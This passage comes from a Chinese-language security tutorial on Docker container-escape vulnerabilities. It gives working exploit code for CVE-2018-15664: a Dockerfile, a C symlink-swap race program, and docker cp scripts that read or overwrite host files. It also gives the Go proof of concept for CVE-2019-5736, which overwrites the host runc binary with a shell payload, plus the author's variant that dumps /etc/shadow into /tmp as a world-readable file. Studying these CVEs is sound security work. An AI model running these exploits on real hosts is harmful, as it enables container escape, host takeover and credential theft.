opensuse/leap</span><br><span class="line"><span class="keyword">ARG</span> SYMSWAP_TARGET=/w00t_w00t_im_a_flag</span><br><span class="line"><span class="keyword">ARG</span> SYMSWAP_PATH=/totally_safe_path</span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&quot;FAILED -- INSIDE CONTAINER PATH&quot;</span> &gt;<span class="string">&quot;<span class="variable">$SYMSWAP_TARGET</span>&quot;</span></span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> --from=0 /builddir/symlink_swap /symlink_swap</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="string">&quot;/symlink_swap&quot;</span>]</span></span><br></pre></td></tr></table></figure>

<p>构筑一个容器：</p>
<ul>
<li>在容器内编译symlink_swap.c为<code>symlink_swap</code>二进制文件，放到容器根目录下</li>
<li>在容器根目录下创建了一个flag性质的文件<code>w00t_w00t_im_a_flag</code>，内容为“FAILED – INSIDE CONTAINER PATH”</li>
<li>容器启动后执行的入口点为<code>/symlink_swap</code></li>
</ul>
<p>symlink_swap.c: 运行在恶意容器内部的恶意程序</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> usage() \</span></span><br><span class="line"><span class="meta">	do &#123; printf(<span class="string">&quot;usage: symlink_swap &lt;symlink&gt;\n&quot;</span>); exit(1); &#125; while(0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> bail(msg) \</span></span><br><span class="line"><span class="meta">	do &#123; perror(<span class="string">&quot;symlink_swap: &quot;</span> msg); exit(1); &#125; while (0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* No glibc wrapper for this, so wrap it ourselves. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RENAME_EXCHANGE (1 &lt;&lt; 1)</span></span><br><span class="line"><span class="comment">/*int renameat2(int olddirfd, const char *oldpath,</span></span><br><span class="line"><span class="comment">              int newdirfd, const char *newpath, int flags)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">	return syscall(__NR_renameat2, olddirfd, oldpath, newdirfd, newpath, flags);</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* usage: symlink_swap &lt;symlink&gt; */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (argc != <span class="number">2</span>)</span><br><span class="line">		usage();</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> *symlink_path = argv[<span class="number">1</span>];</span><br><span class="line">	<span class="type">char</span> *stash_path = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">if</span> (asprintf(&amp;stash_path, <span class="string">&quot;%s-stashed&quot;</span>, symlink_path) &lt; <span class="number">0</span>)</span><br><span class="line">		bail(<span class="string">&quot;create stash_path&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Create a dummy file at symlink_path. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">sb</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">if</span> (!lstat(symlink_path, &amp;sb)) &#123;</span><br><span class="line">		<span class="type">int</span> err;</span><br><span class="line">		<span class="keyword">if</span> (sb.st_mode &amp; S_IFDIR)</span><br><span class="line">			err = rmdir(symlink_path);</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			err = unlink(symlink_path);</span><br><span class="line">		<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">			bail(<span class="string">&quot;unlink symlink_path&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Now create a symlink to &quot;/&quot; (which will resolve to the host&#x27;s root if we</span></span><br><span class="line"><span class="comment">	 * win the race) and a dummy directory at stash_path for us to swap with.</span></span><br><span class="line"><span class="comment">	 * We use a directory to remove the possibility of ENOTDIR which reduces</span></span><br><span class="line"><span class="comment">	 * the chance of us winning.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (symlink(<span class="string">&quot;/&quot;</span>, symlink_path) &lt; <span class="number">0</span>)</span><br><span class="line">		bail(<span class="string">&quot;create symlink_path&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (mkdir(stash_path, <span class="number">0755</span>) &lt; <span class="number">0</span>)</span><br><span class="line">		bail(<span class="string">&quot;mkdir stash_path&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Now we do a RENAME_EXCHANGE forever. */</span></span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">		<span class="type">int</span> err = renameat2(AT_FDCWD, symlink_path,</span><br><span class="line">	                        AT_FDCWD, stash_path, RENAME_EXCHANGE);</span><br><span class="line">		<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">			perror(<span class="string">&quot;symlink_swap: rename exchange failed&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个程序主要做的事：</p>
<ul>
<li>在容器内创建一个名为传入参数（“&#x2F;totally_safe_path”）符号链接，指向<strong>容器的</strong>系统根目录（“&#x2F;”）</li>
<li>不断地交换符号链接与一个正常目录（“&#x2F;totally_safe_path-stashed”）的名字</li>
</ul>
<p>run_read.sh: 模拟<code>docker cp</code>将容器内文件复制到宿主机上场景，一旦触发，容器内恶意符号链接在宿主机文件系统解析后指向的文件将被复制到受害者设定的宿主机目录下</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">SYMSWAP_PATH=/totally_safe_path</span><br><span class="line">SYMSWAP_TARGET=/w00t_w00t_im_a_flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create our flag.</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;SUCCESS -- COPIED FROM THE HOST&quot;</span> | <span class="built_in">sudo</span> <span class="built_in">tee</span> <span class="string">&quot;<span class="variable">$SYMSWAP_TARGET</span>&quot;</span></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">chmod</span> 000 <span class="string">&quot;<span class="variable">$SYMSWAP_TARGET</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Run and build the malicious image.</span></span><br><span class="line">docker build -t cyphar/symlink_swap \</span><br><span class="line">	--build-arg <span class="string">&quot;SYMSWAP_PATH=<span class="variable">$SYMSWAP_PATH</span>&quot;</span> \</span><br><span class="line">	--build-arg <span class="string">&quot;SYMSWAP_TARGET=<span class="variable">$SYMSWAP_TARGET</span>&quot;</span> build/</span><br><span class="line">ctr_id=$(docker run --<span class="built_in">rm</span> -d cyphar/symlink_swap <span class="string">&quot;<span class="variable">$SYMSWAP_PATH</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Now continually try to copy the files.</span></span><br><span class="line">idx=0</span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	<span class="built_in">mkdir</span> <span class="string">&quot;ex<span class="variable">$&#123;idx&#125;</span>&quot;</span></span><br><span class="line">	docker <span class="built_in">cp</span> <span class="string">&quot;<span class="variable">$&#123;ctr_id&#125;</span>:<span class="variable">$SYMSWAP_PATH</span>/<span class="variable">$SYMSWAP_TARGET</span>&quot;</span> <span class="string">&quot;ex<span class="variable">$&#123;idx&#125;</span>/out&quot;</span></span><br><span class="line">	idx=$((<span class="variable">$idx</span> + <span class="number">1</span>))</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>



<p>run_write.sh: 模拟宿主机cp到容器内的场景，触发漏洞，指定的宿主机文件将覆盖容器内恶意符号链接在宿主机文件系统解析后指向的文件</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">SYMSWAP_PATH=/totally_safe_path</span><br><span class="line">SYMSWAP_TARGET=/w00t_w00t_im_a_flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create our flag.</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;FAILED -- HOST FILE UNCHANGED&quot;</span> | <span class="built_in">sudo</span> <span class="built_in">tee</span> <span class="string">&quot;<span class="variable">$SYMSWAP_TARGET</span>&quot;</span></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">chmod</span> 0444 <span class="string">&quot;<span class="variable">$SYMSWAP_TARGET</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Run and build the malicious image.</span></span><br><span class="line">docker build -t cyphar/symlink_swap \</span><br><span class="line">	--build-arg <span class="string">&quot;SYMSWAP_PATH=<span class="variable">$SYMSWAP_PATH</span>&quot;</span> \</span><br><span class="line">	--build-arg <span class="string">&quot;SYMSWAP_TARGET=<span class="variable">$SYMSWAP_TARGET</span>&quot;</span> build/</span><br><span class="line">ctr_id=$(docker run --<span class="built_in">rm</span> -d cyphar/symlink_swap <span class="string">&quot;<span class="variable">$SYMSWAP_PATH</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;SUCCESS -- HOST FILE CHANGED&quot;</span> | <span class="built_in">tee</span> localpath</span><br><span class="line"></span><br><span class="line"><span class="comment"># Now continually try to copy the files.</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	docker <span class="built_in">cp</span> localpath <span class="string">&quot;<span class="variable">$&#123;ctr_id&#125;</span>:<span class="variable">$SYMSWAP_PATH</span>/<span class="variable">$SYMSWAP_TARGET</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>最后的循环，是一直重复将本地的localpath（内容为“SUCCESS”）复制为容器的&#x2F;totally_safe_path&#x2F;w00t_w00t_im_a_flag</p>
<p>由于容器中的<code>symlink_swap</code>程序一直在运行，一直在重复将“&#x2F;totally_safe_path”和“&#x2F;totally_safe_path-stashed”轮流替换为指向系统根目录的符号链接，这样一来，宿主机执行<code>docker cp</code>时，首先<strong>检查</strong>到“&#x2F;totally_safe_path”是一个正常目录，但是后面执行<strong>复制操作</strong>时“&#x2F;totally_safe_path”却变成了一个符号链接，那么Docker将<strong>在宿主机上</strong>解析这个符号链接&#x3D;&#x3D;就是到用的时候没有再次进行容器内的路径解析，直接用了，变成了宿主机上的路径&#x3D;&#x3D;</p>
<blockquote>
<p>如果漏洞触发，容器内的符号链接 &#x2F;totally_safe_path 将在宿主机文件系统上解析，因此<code>docker cp</code>实际上是将 localpath 文件复制到了<strong>宿主机上</strong>的 &#x2F;w00t_w00t_im_a_flag 文件位置。也就是说，此时宿主机上 &#x2F;w00t_w00t_im_a_flag 内容将被改写为：“SUCCESS – HOST FILE CHANGED”</p>
</blockquote>
<blockquote>
<p>对于 CVE-2018-15664 来说，当用户执行<code>docker cp</code>命令后，Docker 守护进程收到这个请求，就会对用户给出的复制路径进行检查。<strong>如果路径中容器内部的符号链接，则先在容器内部将其解析成路径字符串（Docker的<code>FollowSymlinkInScope()</code>函数），留待后用</strong>&#x3D;&#x3D;问题就出在这个“留留待后用”而不是立即使用，引入了竞争条件的空间&#x3D;&#x3D;。一眼看上去，该流程似乎正常，但要考虑到容器内部的环境是不可控的。如果在 Docker 守护进程使用这个路径前将其替换为一个符号链接，那么这个符号链接就会于被打开的主机上解析，从而导致目录穿越。</p>
</blockquote>
<p>关于<code>FollowSymlinkInScope()</code>函数的执行流程上下文，可以看看这个：<a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000044032624">https://segmentfault.com/a/1190000044032624</a></p>
<h3 id="13-2-2-CVE-2019-5736-runC进程替换"><a href="#13-2-2-CVE-2019-5736-runC进程替换" class="headerlink" title="13.2.2 CVE-2019-5736 - runC进程替换"></a>13.2.2 CVE-2019-5736 - runC进程替换</h3><p>Blog: </p>
<ul>
<li><a target="_blank" rel="noopener" href="https://x3fwy.bitcron.com/post/runc-malicious-container-escape%EF%BC%88%E5%88%86%E6%9E%90%E4%BA%86%E4%BF%AE%E5%A4%8D%E8%A1%A5%E4%B8%81%EF%BC%89">https://x3fwy.bitcron.com/post/runc-malicious-container-escape（分析了修复补丁）</a></li>
<li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/266144563">https://zhuanlan.zhihu.com/p/266144563</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46944519/article/details/128253091">https://blog.csdn.net/weixin_46944519/article/details/128253091</a></li>
<li><a target="_blank" rel="noopener" href="https://ancat.github.io/exploitation/2019/02/16/cve-2019-5736.html">https://ancat.github.io/exploitation/2019/02/16/cve-2019-5736.html</a></li>
</ul>
<p>POC: </p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go">https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go</a></li>
</ul>
<p><strong>背景</strong></p>
<p>Docker执行命令，都是调用的runC，流程：</p>
<img src="55ae84af47bc48e2a66f35c8daecd694.png" alt="55ae84af47bc48e2a66f35c8daecd694" style="zoom: 67%;" />



<p><strong>原理</strong></p>
<p>通过覆写和执行主机系统runc二进制文件完成漏洞利用</p>
<p><code>/proc/&#123;PID&#125;/exec</code>：当权限通过的情况下打开这个文件，内核将会之间返回一个<strong>指向该文件的文件描述符</strong>，并非按照传统的打开方式做路径分析和文件查找，这就会<strong>导致绕过了mnt命名空间和chroot的限制</strong></p>
<blockquote>
<p>Linux内核不会按照普通符号链接处理方式在文件系统上做路径解析，而是会直接调用专属的处理函数并返回对应文件的文件描述符</p>
</blockquote>
<p>当执行<code>docker exec</code>命令的时候，runC启动并加入到容器的命名空间中去，其实这个时候容器内的进程<strong>已经能够通过内部的&#x2F;proc&#x2F;观察到它</strong>&#x3D;&#x3D;就是容器内可以知道runC进程的PID号了，PID隔离有缺陷&#x3D;&#x3D;，因此通过打开&#x2F;proc&#x2F;{runc-PID}&#x2F;exe可以获取宿主机上的runC文件标识符，由此能够达到覆盖的能力。如此，下一次用户调用runC去执行命令时，实际执行的将是攻击者放置的指令</p>
<p>攻击流程：</p>
<ol>
<li>攻击者持有一个被控制&#x2F;能执行攻击者POC的容器</li>
<li>容器内运行的用户为root&#x3D;&#x3D;为了能覆写&#x2F;bin&#x2F;bash、操作&#x2F;proc文件系统之类的&#x3D;&#x3D;</li>
<li>Docker调用runC去在容器内执行命令</li>
<li>runC进程加入到了容器namespace</li>
<li>此时容器可以观测到runC进程的PID，获取</li>
<li>通过这个PID，从<code>/proc/&#123;PID&#125;/exe</code>直接获取宿主机上的runC进程的句柄fd，由于&#x2F;proc文件系统的特殊性因此能绕过mnt namespace以及chroot的限制</li>
<li>这个时候容器进程拥有fd，能够从容器中的<code>/proc/self/fd/</code>中操纵宿主机的runC程序</li>
<li>通过这个fd将runC执行的命令替换掉，等到下次Docker再调用runC，就会在宿主机上执行payload</li>
</ol>
<blockquote>
<ol>
<li>将容器内的<code>/bin/sh</code>程序覆盖为<code>#!/proc/self/exe</code></li>
<li>持续遍历容器内&#x2F;proc目录，读取每一个&#x2F;proc&#x2F;{PID}&#x2F;cmdline，对“runc”做字符匹配，直到找到runC进程号</li>
<li>以只读的方式打开&#x2F;proc&#x2F;{runc-PID}&#x2F;exe，拿到文件描述符fd</li>
<li>持续以写方式打开只读fd，直到runC结束占用后，写方式打开成功，通过该fd向宿主机的<code>/usr/bin/runc</code>写入攻击载荷</li>
<li>runC最后将执行用户通过<code>docker exec</code>执行的<code>/bin/sh</code>。因为第一步，实际将执行宿主机上的runc，而runc也以及在第四步被覆盖掉</li>
</ol>
</blockquote>
<img src="888f74b1876744cdaf20bdc72cb4d049.png" alt="888f74b1876744cdaf20bdc72cb4d049" style="zoom: 80%;" />



<blockquote>
<p>此时由于runc在使用中，无法直接覆盖runc，因此需要使用C语言编写PoC。通过<code>O_PATH</code>标志,忽略权限打开runc所在<code>/proc/$&#123;pid&#125;/exe</code>的二进制文件，获取其文件描述符<code>fd</code>。然后再从文件描述符中（<code>/proc/self/fd/$&#123;fd&#125;</code>）以<code>O_WRONLY</code>（只写）标志重新打开文件，然后在一个循环中重复尝试将Payload写入文件描述符中，写入成功后在runc退出的时候会覆盖宿主机上的runc文件。再次使用runc（执行<code>docker exec</code>等）即可执行恶意代码。</p>
</blockquote>
<p><strong>复现</strong></p>
<p>环境：Docker 18.03.1</p>
<p>原始POC：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="comment">// Implementation of CVE-2019-5736</span></span><br><span class="line"><span class="comment">// Created with help from @singe, @_cablethief, and @feexd.</span></span><br><span class="line"><span class="comment">// This commit also helped a ton to understand the vuln</span></span><br><span class="line"><span class="comment">// https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d</span></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">	<span class="string">&quot;strconv&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line">	<span class="string">&quot;flag&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellCmd <span class="type">string</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">	flag.StringVar(&amp;shellCmd, <span class="string">&quot;shell&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;Execute arbitrary commands&quot;</span>)</span><br><span class="line">	flag.Parse()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// This is the line of shell commands that will execute on the host</span></span><br><span class="line">	<span class="keyword">var</span> payload = <span class="string">&quot;#!/bin/bash \n&quot;</span> + shellCmd</span><br><span class="line">	<span class="comment">// First we overwrite /bin/sh with the /proc/self/exe interpreter path</span></span><br><span class="line">	fd, err := os.Create(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Fprintln(fd, <span class="string">&quot;#!/proc/self/exe&quot;</span>)</span><br><span class="line">	err = fd.Close()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">&quot;[+] Overwritten /bin/sh successfully&quot;</span>)</span><br><span class="line">    <span class="comment">// 以上代码，实现下次runC去调用容器内的/bin/bash时，会反而调用/proc/self/exe，即宿主机上的runC进程</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Loop through all processes to find one whose cmdline includes runcinit</span></span><br><span class="line">	<span class="comment">// This will be the process created by runc</span></span><br><span class="line">	<span class="keyword">var</span> found <span class="type">int</span></span><br><span class="line">	<span class="keyword">for</span> found == <span class="number">0</span> &#123;</span><br><span class="line">		pids, err := ioutil.ReadDir(<span class="string">&quot;/proc&quot;</span>)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			fmt.Println(err)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span> _, f := <span class="keyword">range</span> pids &#123;</span><br><span class="line">			fbytes, _ := ioutil.ReadFile(<span class="string">&quot;/proc/&quot;</span> + f.Name() + <span class="string">&quot;/cmdline&quot;</span>)</span><br><span class="line">			fstring := <span class="type">string</span>(fbytes)</span><br><span class="line">			<span class="keyword">if</span> strings.Contains(fstring, <span class="string">&quot;runc&quot;</span>) &#123;</span><br><span class="line">				fmt.Println(<span class="string">&quot;[+] Found the PID:&quot;</span>, f.Name())</span><br><span class="line">				found, err = strconv.Atoi(f.Name())</span><br><span class="line">				<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">					fmt.Println(err)</span><br><span class="line">					<span class="keyword">return</span></span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// We will use the pid to get a file handle for runc on the host.</span></span><br><span class="line">	<span class="keyword">var</span> handleFd = <span class="number">-1</span></span><br><span class="line">	<span class="keyword">for</span> handleFd == <span class="number">-1</span> &#123;</span><br><span class="line">		<span class="comment">// Note, you do not need to use the O_PATH flag for the exploit to work.</span></span><br><span class="line">		handle, _ := os.OpenFile(<span class="string">&quot;/proc/&quot;</span>+strconv.Itoa(found)+<span class="string">&quot;/exe&quot;</span>, os.O_RDONLY, <span class="number">0777</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="type">int</span>(handle.Fd()) &gt; <span class="number">0</span> &#123;</span><br><span class="line">			handleFd = <span class="type">int</span>(handle.Fd())</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">&quot;[+] Successfully got the file handle&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Now that we have the file handle, lets write to the runc binary and overwrite it</span></span><br><span class="line">	<span class="comment">// It will maintain it&#x27;s executable flag</span></span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		writeHandle, _ := os.OpenFile(<span class="string">&quot;/proc/self/fd/&quot;</span>+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, <span class="number">0700</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="type">int</span>(writeHandle.Fd()) &gt; <span class="number">0</span> &#123;</span><br><span class="line">			fmt.Println(<span class="string">&quot;[+] Successfully got write handle&quot;</span>, writeHandle)</span><br><span class="line">			fmt.Println(<span class="string">&quot;[+] The command executed is&quot;</span> + payload)</span><br><span class="line">			writeHandle.Write([]<span class="type">byte</span>(payload))</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面的复现，不知道因何原因会显示“open &#x2F;bin&#x2F;sh: text file busy”这样的报错，容器镜像用的CentOS，猜测是不知有什么进程占用了<code>/bin/sh</code>和<code>/bin/bash</code>。因此我的POC中<code>main()</code>函数的上半部分是这样的：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// This is the line of shell commands that will execute on the host</span></span><br><span class="line">	<span class="keyword">var</span> payload = <span class="string">&quot;#!/bin/bash \n cat /etc/shadow &gt; /tmp/shadow &amp;&amp; chmod 777 /tmp/shadow&quot;</span></span><br><span class="line">	<span class="comment">// First we overwrite /bin/sh with the /proc/self/exe interpreter path</span></span><br><span class="line">	fd, err := os.Create(<span class="string">&quot;/bin/ls&quot;</span>)	<span class="comment">// 这里换成/bin/ls</span></span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	